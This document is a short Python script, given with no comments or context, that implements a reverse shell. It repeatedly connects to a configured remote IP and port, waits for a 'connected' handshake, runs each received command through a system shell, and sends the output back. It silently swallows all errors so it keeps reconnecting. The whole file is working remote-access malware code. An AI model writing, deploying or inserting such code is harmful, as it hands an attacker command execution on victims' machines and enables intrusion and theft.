import socket,subprocess,os
SOURCE = {'IP':'[IP]', 'PORT':[PORT], 'LENGHT':5000}
def shell(command_line: str) -> bytes:
    if command_line[:3] == 'cd ':
        os.chdir(command_line[3:])
        return b'Success'
    result = subprocess.Popen(command_line, 
    stdin=subprocess.PIPE, stderr=subprocess.PIPE,stdout=subprocess.PIPE, shell=True).communicate()
    func = lambda compnet: compnet[0] if compnet[0] != b'' else compnet[1]
    return func(result)
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_api:
            socket_api.connect((SOURCE['IP'], SOURCE['PORT']))
            if socket_api.recv(SOURCE['LENGHT']).decode() != 'connected':
                continue
            while True:
                response = socket_api.recv(SOURCE['LENGHT']).decode()
                Request = shell(response)
                socket_api.send(Request)
    except Exception as e:
        pass